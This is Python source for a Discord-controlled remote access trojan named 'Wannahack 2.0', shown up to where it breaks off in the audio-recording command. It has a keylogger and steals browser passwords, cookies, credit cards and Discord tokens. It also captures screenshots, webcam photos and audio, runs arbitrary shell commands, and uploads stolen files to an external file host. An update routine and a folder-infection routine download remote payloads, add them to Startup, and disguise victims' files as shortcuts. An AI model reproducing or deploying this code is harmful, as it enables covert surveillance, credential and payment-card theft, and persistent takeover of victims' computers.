"""

    :7YPB&@J7????7J@&BPY7:
   7&@@@@@@@@@@@@@@@@@@@@&7
  Y@@@@@@@@@@@@@@@@@@@@@@@@Y
 J@@@@@@@@@@@@@@@@@@@@@@@@@@J
~@@@@@@#?^^7#@@@@#7^^?#@@@@@@~
P@@@@@@7    7@@@@7    ?@@@@@@P
&@@@@@@#?~^?#@@@@#?~~?#@@@@@@&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
7P#@@@@G5JYPGGBBGGPYJ5G@@@@#P?
  .~JP#@Y            Y@#PJ~.

DISCORD RAT WANNAHACK?
"""

import asyncio
import base64
import concurrent
import ctypes
import datetime
import getpass
import json
import os
import random
import re
import shutil

import socket
import sqlite3
import subprocess
import sys
import threading
import time
import urllib
from ctypes import wintypes, c_char, c_buffer, windll, cdll, byref, POINTER, Structure
from urllib.error import HTTPError
from urllib.request import Request, urlopen

import cv2
import discord
import moviepy.video.io.VideoFileClip
import numpy as np
import psutil
import pyautogui
import requests
import sounddevice as sd
from Crypto.Cipher import AES
from colorama import Fore
from discord import File
from discord.ext import commands
from pynput.keyboard import Listener
from scipy.io.wavfile import write

ratt1ngchann3l1d = 1202136082557173841
ratt1nggu1ld1d = 1202136082033164308

us3rn4me = getpass.getuser()
v1ct1m1d = us3rn4me.lower()
pid = os.getpid()
pcname = socket.gethostname()
adm1n = ctypes.windll.shell32.IsUserAnAdmin().__bool__()
processid = os.getpid()

mainfolder = f"C://Users//{us3rn4me}//APPDATA//Roaming//Chrome"
keylogfile = f"{mainfolder}//k3yl0g.txt"

clientinfo = f"`👤` {us3rn4me}@{pcname} `🆔` ID: {v1ct1m1d} `👑` Admin: {adm1n}"
textclientinfo = f"{us3rn4me}@{pcname}"

USERDIR = os.getenv("USERPROFILE")
APPDATA = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")

VARENVLIST = {
    "%APPDATA%": APPDATA,
    "%USERPROFILE%": USERDIR,
    "%LOCALAPPDATA%": LOCAL,
    "%TEMP%": TEMP,
    "%STARTUP%": f"{APPDATA}//Microsoft//Windows//Start Menu//Programs//Startup",
    "%MAINDIR%": mainfolder
}

ratgifurl = "https://cdn.discordapp.com/attachments/1169570134734688267/1217501334341685249/rat.gif?ex=6604417a&is=65f1cc7a&hm=5f84c602487a3ee1c7ccad1a90f779dfbe8073bfe8aac114c6595b5d8b2d7114&"

gifs = {
    'android': 'https://cdn.discordapp.com/attachments/1202136082557173841/1220021932356009994/fileanim.gif?ex=660d6cf7&is=65faf7f7&hm=5669412f7ebfd140ff9cee0b6d06b25c56ad083ff938a95c1adfd3501e68659c&',
    'pchacking': 'https://cdn.discordapp.com/attachments/1202136082557173841/1219745518708592690/fileanim.gif?ex=660c6b89&is=65f9f689&hm=449c51d4e1b65d40455fd1842a6aacd91bd28ba18ed6d630b2bb34ce7b44a0a7&',
    'matrix': 'https://cdn.discordapp.com/attachments/1202136082557173841/1220022819979526204/fileanim.gif?ex=660d6dcb&is=65faf8cb&hm=ba7b7324192b7d942bbd262cddd3243e781485ceb52333afde58d10d9b3a054c&',
    'earth': 'https://cdn.discordapp.com/attachments/1202136082557173841/1219665857962049576/earth1.gif?ex=660c2158&is=65f9ac58&hm=ad4f3e6e83f1215298f6217ef62d9c51f6e5cb1e15cca3470956ed9fcc677a53&',
    'pacman': 'https://cdn.discordapp.com/attachments/1202136082557173841/1220046021720146034/fileanim.gif?ex=660d8366&is=65fb0e66&hm=17a58f0c954883e5a7ef8d4a237d548d0db716bc449f7247563743be4374f01a&'
}

helptext = """
-> !help - Shows this menu
-> !control [client] - Controls a client
-> !select [clients] - Selects several clients
-> !deselect [clients] - Dselects several clients
-> !masscontrol - Selects all clients
-> !activevictims - List of active clients
-> !id - Shows basic info about controlled target ['s]
-> !cd - Changes current working directory
-> !dir (directory) (depth) - Gets a tree of a directory
-> !cmd - Executes a cmd command
-> !run - Executes a run command
-> !screenshot - Gets a screenshot
-> !photo - Gets a photo from a webcam
-> !sendfile [file paths] - Sends files
-> !sendallfiles [source] [keywords] - Sends all files specified
-> !upload [directory] - Uploads files to a directory (attachments required)
-> !findallfiles [keywords] - Gets all file paths specified
-> !reccam [seconds] - Gets a recording from the camera
-> !recscreen [seconds] - Gets a recording of the screen
-> !recaudio [seconds] - Records audio from available sound device
-> !browserdata - Gets all browser info - passwords, cookies etc.
-> !grabdiscord - Gets all discord tokens and basic account info
-> !dumpkeylog - Sends the keylog file (keylogger built in)
-> !wifi - Gets all wifi networks
-> !uacelevate - Shows an UAC prompt in attempt to get admin perms
-> !mu, !md, !mr, !ml (pixels) - Move mouse (up,down,right,left)
-> !write - Write
-> !lmb, !rmb - Self explainatory
-> !shortcut - Uses a shortcut ex. alt f4
-> !timedplay [song] [time] - Plays a song at a specified time ex. !timedplay song.mp3 15:21:37
-> !playaudio [song] - Plays a song
-> !infectfolder [folder] - Infects a folder with the rat
"""

browserdiscordpaths = [
    [f"{APPDATA}/Opera Software/Opera GX Stable/Local Storage/leveldb"],
    [f"{APPDATA}/Opera Software/Opera Stable/Local Storage/leveldb"],
    [f"{APPDATA}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome SxS/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome Beta/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome Dev/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome Unstable/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Google/Chrome Canary/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Vivaldi/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowserCanary/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowserDeveloper/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowserBeta/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowserTech/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Yandex/YandexBrowserSxS/User Data/Default/Local Storage/leveldb"],
    [f"{LOCAL}/Microsoft/Edge/User Data/Default/Local Storage/leveldb"]
]

discordpaths = [
    [f"{APPDATA}/Discord", "/Local Storage/leveldb"],
    [f"{APPDATA}/Lightcord", "/Local Storage/leveldb"],
    [f"{APPDATA}/discordcanary", "/Local Storage/leveldb"],
    [f"{APPDATA}/discordptb", "/Local Storage/leveldb"],
]

browsers = [
    ["avast", LOCAL + "\\AVAST Software\\Browser\\User Data", "", ""],
    ["amigo", LOCAL + "\\Amigo\\User Data", "", ""],
    ["torch", LOCAL + "\\Torch\\User Data", "", ""],
    ["kometa", LOCAL + "\\Kometa\\User Data", "", ""],
    ["orbitum", LOCAL + "\\Orbitum\\User Data", "", ""],
    ["cent-browser", LOCAL + "\\CentBrowser\\User Data", "", ""],
    ["7star", LOCAL + "\\7Star\\7Star\\User Data", "", ""],
    ["sputnik", LOCAL + "\\Sputnik\\Sputnik\\User Data", "", ""],
    ["vivaldi", LOCAL + "\\Vivaldi\\User Data", "", ""],
    ["google-chrome-sxs", LOCAL + "\\Google\\Chrome SxS\\User Data", "<:chrome:1216307581086203904>", "chrome.exe"],
    ["google-chrome", LOCAL + "\\Google\\Chrome\\User Data", "<:chrome:1216307581086203904>", "chrome.exe"],
    ["epic-privacy-browser", LOCAL + "\\Epic Privacy Browser\\User Data", "", ""],
    ["microsoft-edge", LOCAL + "\\Microsoft\\Edge\\User Data", "<:msedge:1216307575973478411>", "edge.exe"],
    ["uran", LOCAL + "\\uCozMedia\\Uran\\User Data", "", ""],
    ["yandex", LOCAL + "\\Yandex\\YandexBrowser\\User Data", "<:yandex:1216307574564192317>", "yandex.exe"],
    ["brave", LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data", "<:brave:1216307573125550131>", "brave.exe"],
    ["opera-gx", APPDATA + "\\Opera Software\\Opera GX Stable", "<:operagx:1216307579484110858>", "opera.exe"],
    ["opera", APPDATA + "\\Opera Software\\Opera Stable", "<:opera:1216307577495752764>", "opera.exe"],
    ["iridium", LOCAL + "\\Iridium\\User Data", "", ""]
]

dataqueries = {
    "login_data": {
        "query": "SELECT action_url, username_value, password_value FROM logins",
        "file": "\\Login Data",
        "columns": ["🌎 URL", "👤 Email/Login", "🔑 Password"],
        "decrypt": True,
    },
    "credit_cards": {
        "query": "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards",
        "file": "\\Web Data",
        "columns": ["📋 Name On Card", "💳 Card Number", "📆 Expires On", "📅 Added On"],
        "decrypt": True,
    },
    "cookies": {
        "query": "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies",
        "file": "\\Network\\Cookies",
        "columns": [
            "🔑 Host Key",
            "📋 Cookie Name",
            "📁 Path",
            "🍪 Cookie",
            "📆 Expires On",
        ],
        "decrypt": True,
    },
    "history": {
        "query": "SELECT url, title, last_visit_time FROM urls",
        "file": "\\History",
        "columns": ["🌎 URL", "📜 Title", "⏰ Visited Time"],
        "decrypt": False,
    },
    "downloads": {
        "query": "SELECT tab_url, target_path FROM downloads",
        "file": "\\History",
        "columns": ["🌎 Download URL", "📁 Local Path"],
        "decrypt": False,
    },
}

emojis = {
    'icons_image': '<:Discord_image:1216470364767518750>',
    'discord': '<:discord:1213228784996716654>',
    'file_explorer': '<:file_explorer:1216133051541749832>',
    'icon_upload': '<:icon_upload:1217122226684428388>',
    'icons_download': '<:icons_download:1216138779207925953>',
    'icons_file': '<:icons_file:1216133053559341137>',
    'icons_files': '<:icons_files:1216133054930751620>',
    'icons_id': '<:icons_id:1216134299817082880>',
    'icons_link': '<:icons_link:1216133056759337060>',
    'icons_ping': '<:icons_ping:1216134298227310663>',
    'mc_earth': '<:mc_earth:1217129519429713941>',
    'pink_computer': '<:pink_computer:1216135798995292210>',
    'user_icon': '<:user_icon:1217194452884394056>',
    'discordlogo': '<a:discordlogo:1217194083362013305>',
    'pchacking': '<a:hacking:1216135035233763529>',
    'mail': '<a:mail:1217194080015089694>',
    'nitro': '<a:discord_nitro:1217196596190773250>',
    'disk': '<a:disk:1217872225328300053>',
    'card': '<a:card:1217194087296536607>',
    'folder': '<a:folder:1217194860927385771>'
}


class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, help_command=None)

    async def setup_hook(self):
        await self.tree.sync(guild=discord.Object(id=ratt1nggu1ld1d))
        print(f"Synced slash commands for {self.user}.")


bot = Bot()


def setup():
    paths = [mainfolder, mainfolder + "//music"]
    for p in paths:
        if not os.path.exists(p): os.mkdir(p)

    if os.path.exists(f"{TEMP}//uacelevate.txt"):
        try:
            oldpidfile = open(f"{TEMP}//uacelevate.txt", "r")
            oldpid = int(oldpidfile.read())
            oldpidfile.close()

            oldprocess = psutil.Process(oldpid)
            oldprocess.kill()
            os.remove(f"{TEMP}//uacelevate.txt")
        except psutil.NoSuchProcess as e:
            print(e)

    def internetcheck():
        if not os.path.exists(mainfolder):
            os.makedirs(mainfolder)
        try:
            requests.get("https://www.google.com")
            return True
        except requests.exceptions.ConnectionError:
            return False

    while not internetcheck():
        time.sleep(1)
        print(Fore.RED + "[INFO] NO INTERNET")

    print(Fore.GREEN + "[INFO] INTERNET CONNECTION ESTABILISHED")
    print(Fore.LIGHTWHITE_EX + "", end="")


def getscriptdir():
    if getattr(sys, 'frozen', False):
        scriptdirectory = os.path.dirname(sys.executable)
    else:
        scriptdirectory = os.path.dirname(os.path.abspath(__file__))

    return scriptdirectory


def keylogger():
    print(Fore.GREEN + "[INFO] KEYLOGGER STARTED")
    if not os.path.exists(keylogfile): open(keylogfile, 'w').close()

    def on_press(key):
        keyinterpretatons = {
            'enter': '\n',
            'backspace': '[BACKSPACE]',
            'space': ' ',
            'shift': '',
            'alt l': '',
            'ctrl': '',
            'ctrl l': '',
            'alt gr': ''
        }
        strkey = str(key).replace("Key.", "").replace("'", "").replace("_", " ")
        if strkey in keyinterpretatons.keys(): strkey = keyinterpretatons[strkey]
        f = open(keylogfile, 'a')
        f.write(strkey)
        f.close()

    with Listener(on_press=on_press) as listener:
        listener.join()


def changecurrentid(id):
    global cid
    cid = id


def unsplit(list):
    value = ""
    for s in list:
        value += s + " "
    return value


def getfileextension(path):
    return str(os.path.basename(path)).split("//")[-1].split(".")[-1]


def getfileio(path):
    try:
        return requests.post(
            f"https://{requests.get('https://api.gofile.io/getServer').json()['data']['server']}.gofile.io/uploadFile",
            files={"file": open(path, "rb")},
        ).json()["data"]["downloadPage"]
    except:
        return False


def getfileembed(path):
    image = ["png", "jpg", "jpeg", "webp"]
    if not os.path.exists(path): return
    embed = discord.Embed(color=0x2B2D31, title=f"`💾` {str(os.path.basename(path)).split('//')[-1]}",
                          description=
                          f"`📊 Filesize:` `{bytestoreadable(os.path.getsize(path))}`\n"
                          f"`🕙 Creation time:` `{datetime.datetime.fromtimestamp(os.path.getctime(path)).strftime('%A, %B %d, %Y %I:%M:%S')}`\n"
                          f"`📁 Exact path:` `{path}`")
    embed.set_thumbnail(
        url=list(gifs.values())[random.randrange(0, len(gifs))])
    embed.set_footer(text=textclientinfo)
    embed.url = getfileio(path)
    return embed


def shortcut(key1, key2):
    pyautogui.keyDown(key2)
    time.sleep(0.4)
    pyautogui.keyDown(key1)
    time.sleep(0.4)
    pyautogui.keyUp(key2)
    pyautogui.keyUp(key1)


def playaudio(path):
    subprocess.run(f"start cmd /c cd {mainfolder} & {mainfolder}/cmdmp3win.exe {path}", shell=True)


class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]


def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(
            byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)
    ):
        return GetData(blob_out)


def getkey(path: str):
    if not os.path.exists(path):
        return

    if "os_crypt" not in open(path + "\\Local State", "r", encoding="utf-8").read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key)
    return key


def decryptpassword(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def getbrowserdata(path: str, profile: str, key, type_of_data):
    try:
        db_file = f"""{path}\\{profile}{type_of_data['file']}"""
        if not os.path.exists(db_file):
            return
        result = ""
        shutil.copy(db_file, "temp_db")
        conn = sqlite3.connect("temp_db")
        cursor = conn.cursor()
        cursor.execute(type_of_data["query"])
        for row in cursor.fetchall():
            row = list(row)
            if type_of_data["decrypt"]:
                for i in range(len(row)):
                    if isinstance(row[i], bytes):
                        row[i] = decryptpassword(row[i], key)
            if type_of_data == "history":
                if row[2] != 0:
                    row[2] = convertchrometime(row[2])
                else:
                    row[2] = "0"

            # print(type_of_data['columns'])
            # print(zip(type_of_data['columns'], row))
            check = ""
            for a, b in zip(type_of_data["columns"], row):
                check += f"{b}"

            if check != "":
                for col, val in zip(type_of_data["columns"], row):
                    result += f"║ {col}: {val}\n"

                result += f"╠══════════════════════════════════════════════════════════════════════\n"

        conn.close()
        os.remove("temp_db")
        return result
    except PermissionError as e:
        print(e)
    except sqlite3.OperationalError as e:
        print(e)


def convertchrometime(chrome_time):
    return (
            datetime(1601, 1, 1) + datetime.timedelta(microseconds=chrome_time)
    ).strftime("%d/%m/%Y %H:%M:%S")


def bytestoreadable(size_in_bytes):
    conversion_factors = {
        "b": 1,
        "kb": 1024,
        "mb": 1024 * 1024,
        "gb": 1024 * 1024 * 1024,
        "tb": 1024 * 1024 * 1024 * 1024,
    }
    try:
        unit = max(unit for unit, factor in conversion_factors.items() if factor < size_in_bytes)
        file_size_in_unit = size_in_bytes / conversion_factors[unit]
        file_size_string = f"{file_size_in_unit:.2f} {unit}"
        return file_size_string
    except ValueError as e:
        return "Error"


def writetofile(content, path):
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
        f.close()


@bot.event
async def on_ready():
    setup()
    os.chdir(USERDIR)

    process = threading.Thread(target=keylogger)
    process._running = True
    process.daemon = True
    process.start()

    await bot.get_channel(ratt1ngchann3l1d).send(f"@here `🔔` | {clientinfo} is online!")
    print(Fore.LIGHTWHITE_EX)


@bot.event
async def on_message(message, os=os, pyautogui=pyautogui, cv2=cv2):
    content = message.content
    if content.startswith("!"):
        args = str(message.content).split(" ")
        for i in range(len(args)):
            for env in VARENVLIST.keys():
                if args[i].find(env) != -1:
                    args[i] = args[i].replace(env, VARENVLIST[env])

        print(args)

        basecommand = args[0]
        print(f"Recieved command >> {basecommand}")

        if basecommand == "!control":
            changecurrentid(args[1])
            if args[1] == v1ct1m1d:
                await message.channel.send(f"`🎮` You are currently controlling {clientinfo}!")

        if basecommand == "!select":
            if v1ct1m1d in args[1:]:
                changecurrentid(v1ct1m1d)
                await message.channel.send(f"`🎮` You are currently controlling {clientinfo}!")

        if basecommand == "!deselect":
            if v1ct1m1d in args[1:]:
                changecurrentid(-1)
                await message.channel.send(f"`🚫` You succesfully stopped controlling {clientinfo}!")

        if basecommand == "!activevictims":
            await message.channel.send(clientinfo)

        if basecommand == "!masscontrol":
            changecurrentid(v1ct1m1d)
            await message.channel.send(f"`🎮` You are currently controlling {clientinfo}!")

        if cid == v1ct1m1d:
            if basecommand == "!help":
                writetofile(helptext, TEMP + "\helpmenu.txt")
                embed = discord.Embed(color=0x2B2D31, title="`🐀` `Wannahack 2.0 RAT`",
                                      description="<a:dance:1218524808053260348> `Huge thanks to:`\n<@708923462072270931> `- Hardware hacking and rat dev.`\n<@830163807707201576> `- Rat developer`")
                embed.set_thumbnail(url=ratgifurl)
                await message.channel.send(embed=embed)
                await message.channel.send(file=File(TEMP + "\helpmenu.txt"))

            if basecommand == "!id":
                await message.channel.send(clientinfo)

            if basecommand == "!installdependencies":
                subprocess.run(
                    f"curl -ko {mainfolder}/cmdmp3win.exe https://cdn.discordapp.com/attachments/1185616202190561300/1212046644263256194/cmdmp3win.exe?ex=65f06966&is=65ddf466&hm=533ba44cd78c68f4ae80bc271fa375de03bbac4828ca939086eabc68d02fb012&")
                subprocess.run(
                    f"curl -ko {mainfolder}/nircmd.exe https://cdn.discordapp.com/attachments/1185616202190561300/1212042560047157320/nircmd.exe?ex=65f06598&is=65ddf098&hm=4bba3f3240af95b3721188df5f938e3dc4480e18bf89d43312b2efaf2d9e958d&")
                embed = discord.Embed(color=0x2B2D31, title="`👍` `Succesfully installed`",
                                      description="```\n NirCmd.exe\n CmdMp3Win.exe```")
                embed.set_image(
                    url=ratgifurl)
                await message.channel.send(embed=embed)

            if basecommand == "!update":
                embedlist = [
                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
                                  description="```css"
                                              "[Downloading...]```"),
                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
                                  description="```Downloading... DONE```"),
                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
                                  description="```Extracting...```"),
                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
                                  description="```Extracting... DONE```"),
                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
                                  description="```Adding to Startup```"),
                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
                                  description="```Removing old build from Startup```"),
                    discord.Embed(color=0x2B2D31, title="<a:update:1218539579947352094> `Updating the rat...`",
                                  description="```FINISHED```"),
                ]
                olddir = os.getcwd()

                zipfilelink = args[1]
                updatename = args[2]
                clearold = args[3]
                curlargs = "-L -o"

                installdirectory = VARENVLIST['%USERPROFILE%'] + "\\URNGuest"

                if len(args) > 4:
                    curlargs = args[4]
                e = embedlist[0]
                e.set_image(url=ratgifurl)
                updatemessage = await message.channel.send(embed=e)
                if not os.path.exists(installdirectory): os.mkdir(installdirectory)
                print(f"curl {curlargs} {installdirectory}/{updatename}.rar {zipfilelink}")
                os.system(f'curl {curlargs} {installdirectory}/{updatename}.rar "{zipfilelink}"')
                e = embedlist[1]
                e.set_image(url=ratgifurl)

                await updatemessage.edit(embed=e)
                os.chdir(installdirectory)
                e = embedlist[2]
                e.set_image(url=ratgifurl)

                await updatemessage.edit(embed=e)
                os.system(f"tar -xf {updatename}.rar")
                time.sleep(0.5)

                e = embedlist[3]
                e.set_image(url=ratgifurl)

                await updatemessage.edit(embed=e)
                exefilepath = None
                for f in os.listdir(updatename):
                    if getfileextension(f) == "exe":
                        exefilepath = f"{installdirectory}/{updatename}/{f}"
                with open(VARENVLIST['%STARTUP%'] + f"/{updatename}.bat", "w") as startupbatch:
                    startupbatch.write(f"@echo off\nstart {exefilepath}")
                    startupbatch.close()
                e = embedlist[4]
                e.set_image(url=ratgifurl)

                await updatemessage.edit(embed=e)
                time.sleep(0.5)

                e = embedlist[5]
                e.set_image(url=ratgifurl)

                await updatemessage.edit(embed=e)

                e = embedlist[6]
                await updatemessage.edit(embed=e)
                os.chdir(olddir)
                os.system(f"start cmd /c start {exefilepath}")
                if clearold == 'True':
                    ratfilename = f"{__file__}"
                    print(ratfilename)
                    for path in os.listdir(VARENVLIST['%STARTUP%']):
                        if getfileextension(path) == "bat":
                            with open(f'{VARENVLIST["%STARTUP%"]}\\{path}', 'r') as f:
                                if f.read().find(ratfilename) != -1:
                                    f.close()
                                    os.remove(f'{VARENVLIST["%STARTUP%"]}\\{path}')

                    ratprocess = psutil.Process(pid)
                    ratprocess.kill()

            if basecommand == "!infectfolder":
                installer = f"""
@echo off
set "zipUrl=https://github.com/FoliowiecGit/Eduware/releases/download/eduware/AdobeUpdateService32.zip"
set "downloadPath=%USERPROFILE%\\URN"
if exist "%downloadPath%" exit
if not exist "%downloadPath%" mkdir "%downloadPath%"
curl -L -o "%downloadPath%\sys.rar" "%zipUrl%"
C:
cd %downloadPath%
tar -xf sys.rar
set "startup=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "batchScriptPath=%startup%\sys.bat"
(
echo @echo off
echo start "" "%downloadPath%"
) > "%batchScriptPath%"
start "" "%downloadPath%"
                """

                directory = os.path.normpath(args[1])
                fakefolder = directory + "\\sys"
                if not os.path.exists(fakefolder):
                    os.mkdir(fakefolder)
                os.system(f"curl -L -o {fakefolder}\\blank.ico https://github.com/Foliowiec/WannaHack/raw/main/blank.ico")
                with open(f"{fakefolder}/sys.bat", 'w') as b:
                    b.write(installer)
                    b.close()
                for path in os.listdir(directory):
                    filename = path
                    path = directory + f"\\{path}"
                    if filename == "sys":
                        continue
                    if os.path.isfile(path):
                        os.system(f'xcopy "{path}" "{fakefolder}"')
                        os.remove(path)
                        ratbatchcontent = f"""
@echo off
if not exist %USERPROFILE%\\URN start /min "" "{fakefolder}\\sys.bat"
"{os.path.normpath(fakefolder + '/' + filename)}"
                """
                    else:
                        shutil.copytree(path, fakefolder)
                        shutil.rmtree(path)
                        ratbatchcontent = f"""
@echo off
if not exist %USERPROFILE%\\URN start /min "" "{fakefolder}\\sys.bat"
explorer.exe "{os.path.normpath(fakefolder + '/' + filename)}"
                """

                    with open(f"{fakefolder}/{filename}'.bat", 'w') as b:
                        b.write(ratbatchcontent)
                        b.close()
                    shortcutbatchcontent = f"""
@echo off
echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
echo sLinkFile = "{directory}\\{filename}.lnk" >> CreateShortcut.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
echo oLink.TargetPath = "{fakefolder}\\{filename}'.bat" >> CreateShortcut.vbs
echo oLink.IconLocation = "{fakefolder}\\blank.ico,0" >> CreateShortcut.vbs
echo oLink.Save >> CreateShortcut.vbs
cscript CreateShortcut.vbs
del CreateShortcut.vbs
                """

                    with open(f"{directory}/sys.bat", 'w') as b:
                        b.write(shortcutbatchcontent)
                        b.close()

                    subprocess.run(f"{directory}/sys.bat", shell=True)

                os.system(f"attrib +h /s /d {fakefolder} & del {directory}/sys.bat")

            if basecommand == "!cd":
                if os.path.exists(args[1]):
                    os.chdir(args[1])
                embed = discord.Embed(color=0x2B2D31,
                                      title=f"{emojis['disk']} `Current working directory changed to:`",
                                      description=f"```{os.getcwd()}```")
                embed.set_footer(text=textclientinfo)
                await message.channel.send(embed=embed)

            if basecommand == "!dir":
                def getdirectory(directory, indent=0, depth=0):
                    try:
                        contents = os.listdir(directory)
                        contents.sort()
                        tree = f""
                        is_last_item = True
                        for i, item in enumerate(contents):
                            item_path = os.path.join(directory, item)
                            if os.path.isdir(item_path) and depth > 0:
                                is_last_item = i < len(contents) - 1
                                if is_last_item:
                                    tree += "   " * indent + "╟ 📁 " + item + "\n"
                                else:
                                    tree += "   " * indent + "╙ 📁 " + item + "\n"
                                subtree = getdirectory(item_path, indent=indent + 2, depth=depth - 1)
                                tree += subtree
                            elif os.path.isfile(item_path):
                                is_last_item = i < len(contents) - 1
                                if is_last_item:
                                    tree += (
                                            "   " * indent
                                            + "╟ 📄 "
                                            + item
                                            + " "
                                            + bytestoreadable(os.path.getsize(item_path))
                                            + "\n"
                                    )
                                else:
                                    tree += (
                                            "   " * indent
                                            + "╙ 📄 "
                                            + item
                                            + " "
                                            + bytestoreadable(os.path.getsize(item_path))
                                            + "\n"
                                    )
                            else:
                                continue

                        return tree
                    except PermissionError as e:
                        return ""

                if len(args) == 3:
                    directory = args[1]
                    depth = args[2]
                elif len(args) == 2:
                    directory = os.getcwd()
                    depth = args[1]
                else:
                    directory = os.getcwd()
                    depth = 3

                f = open(f"{mainfolder}//dir.txt", "w", encoding="utf-8")
                f.write(f"DIRECTORY TREE OF {directory}\n\n" + getdirectory(directory, depth=int(depth)))
                f.close()
                await message.channel.send(file=File(f"{mainfolder}//dir.txt"))

            if basecommand == "!cmd":
                command = unsplit(args[1:])
                subprocess.run(f"cd {os.getcwd()} & {command} >> {mainfolder}//output.txt", shell=True)
                time.sleep(1.5)
                embed = discord.Embed(color=0x2B2D31, title=f"{emojis['pchacking']} `Executed command:`",
                                      description=f"```{command}``` \n{emojis['folder']} `Command output:`")
                embed.set_footer(text=textclientinfo)
                await message.channel.send(embed=embed)
                try:
                    await message.channel.send(file=File(f"{mainfolder}//output.txt"))
                except discord.errors.HTTPException:
                    await message.channel.send(embed=getfileembed(f"{mainfolder}//output.txt"))
                time.sleep(1.5)
                os.remove(f"{mainfolder}//output.txt")

            if basecommand == "!run":
                command = args[1]

                shortcut("r", "win")
                time.sleep(0.3)
                pyautogui.write(command)
                pyautogui.sleep(0.2)
                pyautogui.press("enter")

                embed = discord.Embed(color=0x2B2D31, title=f"{emojis['pchacking']} `Executed run command:`",
                                      description=f"```{command}```")
                embed.set_footer(text=textclientinfo)
                await message.channel.send(embed=embed)

            if basecommand == "!timedplay":
                def gethour():
                    currenttime = urlopen("http://just-the-time.appspot.com/")
                    currentstrtime = str(currenttime.read().strip())[-9:-1]
                    currenthour = str(currentstrtime[:2])
                    utcplus1hour = str(int(currentstrtime[:2]) + 1)
                    currentstrtime = currentstrtime.replace(currenthour, utcplus1hour)
                    return currentstrtime

                path = mainfolder + "/music/" + args[1]
                if not os.path.exists(path):
                    return
                while True:
                    ctime = gethour()
                    print(ctime)
                    if ctime == args[2]:
                        break
                embed = discord.Embed(color=0x2B2D31)
                embed.set_footer(text=textclientinfo)
                embed.add_field(name="", value=f"`🎶 Playing file!` \n ```{path}```", inline=True)
                embed.set_thumbnail(
                    url="https://i.pinimg.com/originals/63/17/31/63173162a98b20f741f434b2ee1b5de4.gif")
                await message.channel.send(embed=embed)
                playaudio(path)

            if basecommand == "!playaudio":
                path = mainfolder + "/music/" + args[1]
                if not os.path.exists(path):
                    return
                embed = discord.Embed(color=0x2B2D31)
                embed.set_footer(text=textclientinfo)
                embed.add_field(name="", value=f"`🎶 Playing file!` \n ```{path}```", inline=True)
                embed.set_thumbnail(
                    url="https://i.pinimg.com/originals/63/17/31/63173162a98b20f741f434b2ee1b5de4.gif")
                await message.channel.send(embed=embed)
                playaudio(path)

            if basecommand == "!screenshot":
                pyautogui.screenshot().save(f"{mainfolder}//screenshot.png")
                await message.channel.send(file=File(f"{mainfolder}//screenshot.png"))

            if basecommand == "!photo":
                camport = 0
                camera = cv2.VideoCapture(camport)
                returnvalue, image = camera.read()
                cv2.imwrite(TEMP + "\photo.png", image)
                await message.channel.send(file=File(TEMP + "\photo.png"))

            if basecommand == "!recaudio":
                soundpath = TEMP + "\sound.wav"
                fs = 44100
                duration = int(args[1])
                record_voice = sd.rec(int(duration * fs), samplerate=fs, channels=2)
